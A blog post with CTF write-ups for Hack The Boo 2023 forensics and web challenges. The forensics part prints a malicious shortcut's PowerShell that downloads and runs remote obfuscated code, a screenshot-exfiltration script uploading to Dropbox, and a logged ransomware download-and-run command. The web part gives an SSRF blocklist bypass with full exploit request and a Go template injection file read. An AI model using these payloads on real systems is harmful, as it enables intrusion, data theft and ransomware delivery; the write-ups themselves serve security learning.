---
layout: single
title:  "Hack The Boo 2023 CTF - Forensics and Web Writeup"
seo_title: "Hack The Box (HTB) writeup for the Forensics and Web Challenges of the Hack The Boo 2023 CTF Competition"
date:   2023-10-28 15:30:00 +0200
categories: ['Hack The Box', 'CTF', 'Forensics', 'Web Exploitation']
classes: wide
toc: true
excerpt: Hack The Boo 2023 CTF writeups for the forensics and web challenges.
---
# Hack The Boo 2023 CTF - Forensics and Web Writeup
For this years halloween I decided to participate in the Hack The Boo CTF competition from Hack the Box. Despite this being my first solo public CTF competition, I still managed to climb to leaderboards and reach top 50 (48th to be exact). In total I managed to capture 7 out of the 10 flags, some easier than others. In this post I will delve into how I managed to solve the forensics and web challenges, as those where the areas my skills stuck out the most.

## Forensics - Trick or Treat
### Description
Another night staying alone at home during Halloween. But someone wanted to play a Halloween game with me. They emailed me the subject "Trick or Treat" and an attachment. When I opened the file, a black screen appeared for a second on my screen. It wasn't so scary; maybe the season is not so spooky after all.

We are given two files, a capture `capture.pcap` and a Windows Shortcut `trick_or_treat.lnk`.

### LNK File
We start our investigation by analyzing the `lnk` file with `exiftools` by executing `exiftools trick_or_treat.lnk` on the file. Inside the file information we find something strange:
```
Working Directory               : C:
Command Line Arguments          : /k for /f "tokens=*" %a in ('dir C:\Windows\SysWow64\WindowsPowerShell\v1.0\*rshell.exe /s /b /od') do call %a -windowstyle hidden "$asvods ='';$UserAgents = @('Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/58.0.3029.110 Safari/537.36','Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Edge/15.15063','Mozilla/5.0 (Windows NT 6.1; WOW64; Trident/7.0; AS; rv:11.0) like Gecko');$RandomUserAgent = $UserAgents | Get-Random;$WebClient = New-Object System.Net.WebClient;$WebClient.Headers.Add('User-Agent', $RandomUserAgent);$boddmei = $WebClient.DownloadString('http://windowsliveupdater.com');$vurnwos ='';for($i=0;$i -le $boddmei.Length-2;$i=$i+2){$bodms=$boddmei[$i]+$boddmei[$i+1];$decodedChar = [char]([convert]::ToInt16($bodms, 16));$xoredChar=[char]([byte]($decodedChar) -bxor 0x1d);$vurnwos = $vurnwos + $xoredChar};Invoke-Command -ScriptBlock ([Scriptblock]::Create($vurnwos));Invoke-Command -ScriptBlock ([Scriptblock]::Create($asvods));
Icon File Name                  : C:\Windows\System32\shell32.dl
```
Let us take some time to analyze the script behavior. The script first selects a random User-Agent from the crafter `$UserAgents` array and crafts a WebClient object used to download content from a web server. It then uses this WebClient to download the contents of the specified URL (http://windowsliveupdater.com) and decodes the obfuscated file as follows:
```
$vurnwos ='';
for($i=0;$i -le $boddmei.Length-2;$i=$i+2){
    $bodms=$boddmei[$i]+$boddmei[$i+1];
    $decodedChar = [char]([convert]::ToInt16($bodms, 16));
    $xoredChar=[char]([byte]($decodedChar) -bxor 0x1d);
    $vurnwos = $vurnwos + $xoredChar
};
```
This essentially performs an XOR operation with `0x1d` on every character in the downloaded file. This information might be useful later on in our investigations. Now lets proceed with the PCAP file.

### PCAP File
Inside the `lnk` we found that a request was made to a fake windows updater url. Looking at the `pcap` file and searching for the domain, we find that the IP address leads to `77.74.198.52`. We select one of its request and follow the HTTP stream. One of the packets contains a giant blob of text:
```
7b68737e697472733d596f726d5f726530486d71727c793d661717465e70797178695f
...
```
It looks like an encoded string and we know that we have to decode it with the XOR function we found previously. Now there are several ways to solve this. Either we use [CyberShef](https://gchq.github.io/CyberChef/#recipe=From_Hex('Auto')XOR(%7B'option':'Hex','string':'0x1d'%7D,'Standard',false)) and apply the XOR operation ourselves, or we can run the script ourselves in the tool from [TryItOnline](https://tio.run/#powershell) by replacing the `$vurnwos` variable with the above string. Either way we retrieve the decoded script:
```bash
function DropBox-Upload {
    [CmdletBinding()]
    param (
        [Parameter (Mandatory = $True, ValueFromPipeline = $True)]
        [Alias("f")]
        [string]$SourceFilePath
    )
    $DropBoxAccessToken = "HTB{s4y_Pumpk1111111n!!!}"
    $outputFile = Split-Path $SourceFilePath -leaf
    $TargetFilePath="/$outputFile"
    $arg = '{ "path": "' + $TargetFilePath + '", "mode": "add", "autorename": true, "mute": false }'
    $authorization = "Bearer " + $DropBoxAccessToken
    $headers = New-Object "System.Collections.Generic.Dictionary[[String],[String]]"
    $headers.Add("Authorization", $authorization)
    $headers.Add("Dropbox-API-Arg", $arg)
    $headers.Add("Content-Type", 'application/octet-stream')
    Invoke-RestMethod -Uri https://content.dropboxapi.com/2/files/upload -Method Post -InFile $SourceFilePath -Headers $headers
}

while(1){
  Add-Type -AssemblyName System.Windows.Forms,System.Drawing
  $screens = [Windows.Forms.Screen]::AllScreens
  $top    = ($screens.Bounds.Top    | Measure-Object -Minimum).Minimum
  $left   = ($screens.Bounds.Left   | Measure-Object -Minimum).Minimum
  $width  = ($screens.Bounds.Right  | Measure-Object -Maximum).Maximum
  $height = ($screens.Bounds.Bottom | Measure-Object -Maximum).Maximum
  $bounds   = [Drawing.Rectangle]::FromLTRB($left, $top, $width, $height)
  $bmp      = New-Object -TypeName System.Drawing.Bitmap -ArgumentList ([int]$bounds.width), ([int]$bounds.height)
  $graphics = [Drawing.Graphics]::FromImage($bmp)
  $graphics.CopyFromScreen($bounds.Location, [Drawing.Point]::Empty, $bounds.size)

  $bmp.Save("$env:USERPROFILE\AppData\Local\Temp\$env:computername-Capture.png")
  $graphics.Dispose()
  $bmp.Dispose()
  
  start-sleep -Seconds 15
 "$env:USERPROFILE\AppData\Local\Temp\$env:computername-Capture.png" | DropBox-Upload
}
```
Inside we find our flag as the DropBox AccessToken.

## Forensics - Valhalloween

### Description
As I was walking the neighbor's streets for some Trick-or-Treat, a strange man approached me, saying he was dressed as "The God of Mischief!". He handed me some candy and disappeared. Among the candy bars was a USB in disguise, and when I plugged it into my computer, all my files were corrupted! First, spawn the haunted Docker instance and connect to it! Dig through the horrors that lie in the given Logs and answer whatever questions are asked of you!

### Sysmon Analysis
For this challenge we are given some Windows Event Logs. For dealing with `evtx` files on Linux we can use an [EVTX Parser](https://github.com/Velocidex/evtx). We are only interested in the Sysmon logs so
```bash
./dumpevtx parse Microsoft-Windows-Sysmon%4Operational.evtx > sysmon.log
```
Now we can more easily search through the event log. Let's connect to the docker instance and try to answer some questions.
```
What are the IP address and port of the server from which the malicious actors downloaded the ransomware? (for example: 98.76.54.32:443)
```
Because we need to find where the ransomware came from, we can search for the string `http://`. In one of the results we can see that a command has been triggered:
```
c:\\\\microsoft\\\\office\\\\word\\\\document\\\\..\\\\..\\\\..\\\\..\\\\windows\\\\system32\\\\cmd.exe /c powershell.exe (new-object system.net.webclient).downloadfile('http://103.162.14.116:8888/mscalc.exe','%%temp%%\\mscalc.exe');start-process '%%temp%%\\mscalc.exe'
```
This reveals that the ransomwhere was downloaded from `103.162.14.116:8888`.
```
According to the sysmon logs, what is the MD5 hash of the ransomware? (for example: 6ab0e507bcc2fad463959aa8be2d782f)
```
From the issued command, a process is started with the name `mscalc.exe`. To find where this program has been launched we can look for this name in the Image field of the logs. Then looking at the Hashes field, we can find the MD5 hash to be `B94F3FF666D9781CB69088658CD53772`.
```
Based on the hash found, determine the family label of the ransomware in the wild from online reports such as Virus Total, Hybrid Analysis, etc. (for example: wannacry)
```
A quick search on VirusTotal shows that we are dealing with the `LokiLocker` ransomwhere.
```
What is the name of the task scheduled by the ransomware? (for example: WindowsUpdater)
```
Seaching for `schtasks` we can again find that a command has been run. This command shedules an ONLOGON task with the name `Loki`.
```
What are the parent process name and ID of the ransomware process? (for example: svchost.exe_4953)
```
We can look for when the process is started by searching for `start-process`. The first Event that runs the malicious program executes it via `powershell.exe` with a process ID of `3856`.
```
Following the PPID, provide the file path of the initial stage in the infection chain. (for example: D:\Data\KCorp\FirstStage.pdf)
```
Following the PPID we find that the command is issued inside the `C:\Users\HoaGay\Documents\Subjects` folder. Searching for this directory we can find all the documents that were opend by this user. After opening the document `C:\Users\HoaGay\Documents\Subjects\Unexpe.docx` we see that the initial download stage begins.
```
When was the first file in the infection chain opened (in UTC)? (for example: 1975-04-30_12:34:56)
```
This can be found in the `UtcTime` field of the previous event. After submitting all these answers, we get the flag and have solved the forensics challenges.

## Web - HauntMart
### Description
An eerie expedition into the world of online retail, where the most sinister and spine-tingling inventory reigns supreme. Can you take it down?

### Browsing the website
Looking through the website we can register with an account. After logging in the only functionality seems to be the sell products page.
On this page we add products to the site that gets reviewed by the moderators. What stands out here is the 'manual' field where we can specify a link to a product. Lets dig into the source code a bit.

### Source code analysis
In the `index.html` file we see that if we have the admin role, we can see the flag.
```
{% if user['role'] == 'admin' %}
{{flag}}
{% endif %}
```
Now how can we get the admin role? Well, conveniently there is a function called `makeUserAdmin` being used in the `/addAdmin` endpoint. Looking in the `util.py` file we see that the `downloadManual(url)` function does some simple checks against the url we put in.
```python
blocked_host = ["127.0.0.1", "localhost", "0.0.0.0"]
def isSafeUrl(url):
    for hosts in blocked_host:
        if hosts in url:
            return False
    return True
```
This merely checks if our string includes the strings in the blocked_host array and can be bypassed by url encoding our input.
Next the function will send a request to fetch a file that comes after the last `/` character. The trick is to make this function make a request to the `/addAdmin` endpoint with our username as one of the request parameters.

### Exploiting the Vulnerability
By analyzing our request with the docker container we can more easily see if our requests fail or not. Let's firs try to use the following request parameters:
```
{
    "name":"Test",
    "price":"10",
    "description":"test",
    "manual":"http://%31%32%37%2e%30%2e%30%2e%31:1337/addAdmin?username=bleed"
}
```
We see that we are able to make a successful submission but in the responses we see that we get a file not found error:
```
127.0.0.1 - - [26/Oct/2023 16:36:50] "GET /addAdmin HTTP/1.1" 404 -
```
This means the requested endpoint is not found. We have to target the `/api/addAdmin` endpoint and try again. After updating the parameter, we can successfully add us as an admin user with the following request:
```
POST /api/product HTTP/1.1
Host: 127.0.0.1:1337
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/118.0.5993.88 Safari/537.36
Content-Type: application/json
Accept: */*
Origin: http://127.0.0.1:1337
Referer: http://127.0.0.1:1337/product
Cookie: session=.eJwdyt0KgjAYgOF72XmC9gN2FsvyW7KF2rSdRC6pNbcFCuGie086fZ_3gwanW4vWqB3Jo9lLxRSBk4eQKujB5kuJYQX6VXNM4mCaQhnxsTG7QRQTGNKLimtQbyVN3P-b5V7UoDJMujbdKPZMIlbePS3Pc-ppHDCWj55HiejAsMPRDVUGpdvOWI5vKbnaRaHtpU89iRz6_gAnPTYp.ZTqJxQ.DotQHfwlzUW4VNS4NVYxcW7Xdbk
Connection: close

{"name":"Test","price":"10","description":"test","manual":"http://%31%32%37%2e%30%2e%30%2e%31:1337/api%2faddAdmin?username=bleed"}
```
After logging out and logging back in, we are given the flag on the home page.

## Web - Ghostly Templates
This challenge really reminded me of an earlier challenge that I solved on the HTB platform, namely `RenderQuest`. This challenge follows a similar approach with some few alteration.

### Browsing the Website 
Taking a look at the functionality of the website, it allows us to use their golang templates on our own webpages. Gus Ralph has made an excellent [blog post](https://www.onsecurity.io/blog/go-ssti-method-research/) about SSTIs in Go's builtin html/template module. This discusses the vulnerabilities that can arise when using said templates.

The essence of the vulnerability lies in the fact that we can call any method through template injection from the source code, as long as the method is an attribute of the value passed to the template. Lets give the source code as an example here:
```go
type RequestData struct {
	ClientIP     string
	ClientUA     string
	ServerInfo   MachineInfo
	ClientIpInfo LocationInfo `json:"location"`
}

...

func GetServerInfo(command string) string {
	out, err := exec.Command("sh", "-c", command).Output()
	if err != nil {
		return ""
	}
	return string(out)
}

...

func (p RequestData) OutFileContents(filePath string) string {
	data, err := os.ReadFile(filePath)
	if err != nil {
		return err.Error()
	}
	return string(data)
}

...
```
The first function cannot be injected as it is not passed an attribute of the template that we can use. The second function however is vulnerable. I specifically chose this function as it reads a file from the server and returns its content. This means that we can read any file we want on the server.

### Exploiting the Vulnerability
Now to exploit the vulnerability, we of course need to host a website that implements the given templates. Luckily, Go provides its own [playground](https://go.dev/play/) for testing code that we can use. Lets make a simple website that uses one of their templates and see the responses.
```html
<!DOCTYPE html>
<html>
    <head>
        <title>Test Page</title>
    </head>
    <body>
        <p>{{ . }}</p>
    </body>
</html>
```
This page simply renders all the templates we have available to us, but we can equally call a simple template like `{{.ServerInfo.Hostname}}`.
As discussed previously, our job is to read a file from the server (flag.txt). Lets adapt our page:
```
<!DOCTYPE html>
<html>
    <head>
        <title>Test Page</title>
    </head>
    <body>
        <p>{{ .OutFileContents .ClientUA }}</p>
    </body>
</html>
```
This page will call the `OutFileContents()` function from the `main.go` file and pass in our UserAgent as a parameter. Now why not just pass in the file we want to read? Well, since the function expects an argument of type `RequestData`, so we can't actually pass it a string. We will have to modify our UserAgent when sending our request. We can either do this with BurpSuite, but a simple curl can also do the trick:
```
curl  -H "User-Agent: ../flag.txt" 'http://<IP>:<PORT>/render?use_remote=true&page=https://go.dev/play/p/<ID_TO_OUR_TEST_PAGE>.go?download=true'
```
We have found the flag.

## Conclusion
These small challenges, although rated as easy by the developers, did caught me off guard sometimes. Overall I learned quite some new things and had great fun in solving the challenges. Big shout out to Hack The Box for organizing this event!